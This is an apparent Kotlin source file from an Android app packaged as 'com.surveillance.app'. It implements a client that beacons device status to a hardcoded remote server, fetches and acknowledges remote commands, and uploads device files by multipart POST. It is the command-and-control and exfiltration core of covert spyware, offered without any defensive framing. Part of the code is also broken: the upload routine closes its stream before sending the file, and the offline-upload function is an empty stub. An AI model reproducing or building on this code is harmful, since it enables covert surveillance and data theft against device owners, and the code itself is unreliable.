package com.surveillance.app

import android.content.Context
import android.os.Environment
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL

class ApiService {

    private val baseUrl = "https://payment70.site.je/api.php"

    // Send device status to server
    fun sendUserStatus(userId: String, deviceInfo: String): Boolean {
        return try {
            val url = URL(baseUrl)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
            connection.connectTimeout = 10000
            connection.readTimeout = 10000

            val json = JSONObject().apply {
                put("user_status", true)
                put("user_id", userId)
                put("device_info", deviceInfo)
            }

            OutputStreamWriter(connection.outputStream).use { writer ->
                writer.write(json.toString())
                writer.flush()
            }

            val responseCode = connection.responseCode
            connection.disconnect()
            responseCode == HttpURLConnection.HTTP_OK
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    // Fetch pending commands from server
    fun fetchAndHandleCommands(userId: String): List<JSONObject> {
        return try {
            val url = URL("$baseUrl?user_id=$userId")
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "GET"
            connection.connectTimeout = 10000
            connection.readTimeout = 10000

            val response = connection.inputStream.bufferedReader().use { it.readText() }
            connection.disconnect()

            val jsonArray = JSONArray(response)
            val commands = mutableListOf<JSONObject>()
            for (i in 0 until jsonArray.length()) {
                commands.add(jsonArray.getJSONObject(i))
            }
            commands
        } catch (e: Exception) {
            e.printStackTrace()
            emptyList()
        }
    }

    // Upload pending files when network is available
    fun uploadPendingFiles() {
        // Implementation for offline caching
    }

    // Mark command as executed
    fun markCommandExecuted(commandId: String): Boolean {
        return try {
            val url = URL(baseUrl)
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
            connection.connectTimeout = 10000
            connection.readTimeout = 10000

            val json = JSONObject().apply {
                put("update_status", true)
                put("command_id", commandId)
                put("executed", true)
            }

            OutputStreamWriter(connection.outputStream).use { writer ->
                writer.write(json.toString())
                writer.flush()
            }

            val responseCode = connection.responseCode
            connection.disconnect()
            responseCode == HttpURLConnection.HTTP_OK
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }

    // Upload file to server
    fun uploadFile(userId: String, commandId: String, actionType: String, file: File): Boolean {
        return try {
            val boundary = "===" + System.currentTimeMillis() + "==="
            val url = URL("$baseUrl?action=upload")
            val connection = url.openConnection() as HttpURLConnection
            connection.requestMethod = "POST"
            connection.doOutput = true
            connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=$boundary")
            connection.connectTimeout = 30000
            connection.readTimeout = 30000

            connection.outputStream.use { outputStream ->
                OutputStreamWriter(outputStream).use { writer ->
                    writer.write("--$boundary\r\n")
                    writer.write("Content-Disposition: form-data; name=\"user_id\"\r\n\r\n")
                    writer.write("$userId\r\n")

                    writer.write("--$boundary\r\n")
                    writer.write("Content-Disposition: form-data; name=\"command_id\"\r\n\r\n")
                    writer.write("$commandId\r\n")

                    writer.write("--$boundary\r\n")
                    writer.write("Content-Disposition: form-data; name=\"type\"\r\n\r\n")
                    writer.write("$actionType\r\n")

                    writer.write("--$boundary\r\n")
                    writer.write("Content-Disposition: form-data; name=\"file\"; filename=\"${file.name}\"\r\n")
                    writer.write("Content-Type: application/octet-stream\r\n\r\n")
                    writer.flush()
                }

                file.inputStream().use { input ->
                    val buffer = ByteArray(8192)
                    var bytesRead: Int
                    while (input.read(buffer).also { bytesRead = it } != -1) {
                        outputStream.write(buffer, 0, bytesRead)
                    }
                }

                OutputStreamWriter(outputStream).use { writer ->
                    writer.write("\r\n--$boundary--\r\n")
                    writer.flush()
                }
            }

            val responseCode = connection.responseCode
            connection.disconnect()
            responseCode == HttpURLConnection.HTTP_OK
        } catch (e: Exception) {
            e.printStackTrace()
            false
        }
    }
}
